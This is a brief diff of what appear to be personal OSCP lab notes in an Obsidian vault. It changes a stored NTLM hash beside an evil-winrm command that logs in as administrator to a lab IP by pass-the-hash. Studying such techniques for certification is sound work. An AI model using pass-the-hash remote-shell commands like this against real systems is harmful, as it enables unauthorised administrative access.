@@ -116,7 +116,7 @@ evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 ```
 
 MODIFY: 
-hash:: 32693b11e6aa90eb43d32c72a07ceea6
+hash:: 823452073d75b9d1cf70ebdf86c7f98e
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
